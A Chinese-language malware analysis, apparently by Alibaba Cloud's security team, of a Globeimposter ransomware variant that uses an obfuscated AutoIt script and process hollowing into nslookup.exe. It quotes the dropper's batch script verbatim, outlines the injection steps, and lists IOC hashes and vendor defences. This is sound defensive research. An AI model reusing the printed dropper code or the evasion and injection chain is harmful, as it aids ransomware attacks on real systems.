## 背景

Globeimposter勒索病毒家族从2017年出现，自问世以来一直比较活跃，相继出现过多次变种。最近阿里云云安全中心捕捉到Globeimposter勒索病毒又一新型变种，该变种借助混淆后的AutoIt脚本，通过Process
Hollowing技术将勒索主程序注入到系统进程nslookup.exe中，意图绕过检测。

## 行为分析

恶意样本是一个7zsfx自解压程序，释放出Bonta.dot、Finestre.dot、Indicibili.dot和Mio.dot四个文件。随后创建Dai.exe.com和nslookup进程，扫描并加密系统中重要文件，新文件后缀为.Globeimposter-Alpha865qqz。

攻击流程图如下:  
![image](https://image.3001.net/images/20210709/1625825015_60e81ef79b88cfee73fc3.png!small)

## 技术细节

### Indicibili.dot

Indicibili.dot 是一个bat脚本，主要用于生成AutoIt.exe程序和被混淆的AutoIt脚本，并执行。

> Set MCdsqERpC=%userdomain%  
> Set MjRYgh=DESKTOP-QO5QU33  
> if %MCdsqERpC%==%MjRYgh% exit  
> <nul set /p = "MZ" > Dai.exe.com  
> findstr /V /R
> "^hiPtIoKeNshfanfAndQnqDMrmYpIRSelkxawakUWFbbJRZWkNIEljUMKcMFKZelVgrrXuhojcTTCyekAwYVpgRXsIHGFGlXDhCxOVZtmmsOaqpEaBtIwuqHbuLfnHDGkWffD$"
> Bonta.dot >> Dai.exe.com"  
> copy Finestre.dot d  
> start Dai.exe.com d  
> ping 127.0.0.1 -n 30

### Bonta.dot

Bonta.dot是一个伪装后的AutoIt.exe解释器,
仅在开头部分加入了^hiPtIoKeNshfanfAndQnqDMrmYpIRSelkxawakUWFbbJRZWkNIEljUMKcMFKZelVgrrXuhojcTTCyekAwYVpgRXsIHGFGlXDhCxOVZtmmsOaqpEaBtIwuqHbuLfnHDGkWffD$并抹去了PE结构的MZ标志。

• 恶意样本释放Bonta.dot后再修改，而不是直接释放AutoIt.exe，猜测是为了减少杀软对其关联检测。

• 恶意样本时间戳显示为2016年，但最终释放的AutoIt.exe数字签名显示为2018年，说明病毒作者手动修改了样本的编译时间来进行伪装。

### Finestre.dot

Finestre.dot是一个混淆之后的AuotIt脚本，主要将勒索程序注入到nslookup进程中。原始脚本约有1030KB(21090行)，使用我们的反混淆工具精简后大约300行。脚本主要内容如下：

• 检查主机是否为某些例外。  
![image](https://image.3001.net/images/20210709/1625825215_60e81fbfd5fa31c3f2449.png!small)

• 使用"5619570"生成密钥，以此来解密Globeimposter勒索病毒PE到内存中。  
![image](https://image.3001.net/images/20210709/1625825227_60e81fcb43a864d64c2cb.png!small)

•
启动系统自带的nslookup.exe作为傀儡进程，注入Globeimposter。在nslookup和AutoIt进程中为解密后的Globeimposter分配相应的内存，记为AddressAutoIt和AddressNsLookUp，将其映射到AddressAutoIt。随后以AddressNsLookUp为最新基地址手动修复重定位信息，并通过WriteProcessMemory写入AddressNsLookUp。  
![image](https://image.3001.net/images/20210709/1625825250_60e81fe217ee556fb5ca0.png!small)

•
修改nslookup的PEB.ImageBaseAddress为AddressNsLookUp，然后使用NtAlertResumeThread恢复nslookup进程运行。  
![image](https://image.3001.net/images/20210709/1625825283_60e820031c74f3d381f31.png!small)

•
nslookup进程的PEB.ImageBaseAddress此时指向被写入的Globeimposter的PE头，随后nslookup进程初始化执行LdrInitializeThunk函数，它根据ImageBaseAddress去加载被注入的Globeimposter的IAT表，并从SetThreadContext设置好的入口开始执行Globeimposter。  
![image](https://image.3001.net/images/20210709/1625825310_60e8201e5a1a51208e632.png!small)

### Mio.dot

Mio.dot是加密后的勒索病毒可执行文件，解密之后MD5为2032411667f14d824286b1d02e579a78，属于Globeimposter家族。

### IOCs

> 恶意样本：4f1653ba079eeb4c58b4caccabc921bb  
> Indicibili.dot：11751b7002be5085bdd71968a8e2baa9  
> Mio.dot：b0b1a62aa0e8ed3bf7a36eec069a6881  
> Bonta.dot：daef86658ef82dbe10e5f75e369041c7  
> Finestre.dot： 0b222c417df79d162b906c1e318c8efb  
> AutoIt.exe：c56b5f0201a3b3de53e561fe76912bfd  
> Globeimposter(解密的Mio.dot)：2032411667f14d824286b1d02e579a78

## 应对措施

从前面的分析可以看出，随着杀软对抗升级，勒索软件也开始加入越来越多的对抗手段，白+黑、无文件、傀儡进程。可以预见，随着勒索病毒的发展，勒索病毒在未来几年仍然是企业面临的最大威胁之一，同时未来一定会有更多成熟的技术高超的黑客组织通过勒索病毒发起攻击。勒索病毒对企业来说是危害极大的安全风险之一，一旦核心数据或文件被加密，除了缴纳赎金，基本上无法解密。阿里云云安全中心（主机防御）已经实现逐层递进的纵深式防御：

•
首先借助云上全方位的威胁情报，云安全中心实现了对大量已知勒索病毒的实时防御，在企业主机资源被病毒感染的第一时间进行拦截，避免发生文件被病毒加密而进行勒索的情况；

•
其次，通过放置诱饵的方式，云安全中心实时捕捉可能的勒索病毒行为，尤其针对新型未知的勒索病毒，一旦识别到有异常加密行为发生，会立刻拦截同时通知用户进行排查，进行清理；

•
最后，在做好对勒索病毒防御的情况下，云安全中心还支持文件备份服务，能定期对指定文件进行备份，支持按时间按文件版本恢复，在极端情况发生而导致文件被加密时，能够通过文件恢复的方式找回，做到万无一失。

阿里云云安全中心用户只需要在控制台 主动防御 - 防勒索 中，开通“防勒索”功能：  
![image](https://image.3001.net/images/20210709/1625825418_60e8208aab354c4bfecf6.png!small)

阿里云云安全中心用户只需要在控制台 设置 - 主动防御 中，开启“防病毒”、“诱饵捕获”功能：  
![image](https://image.3001.net/images/20210709/1625825426_60e8209279e1020709d08.png!small)

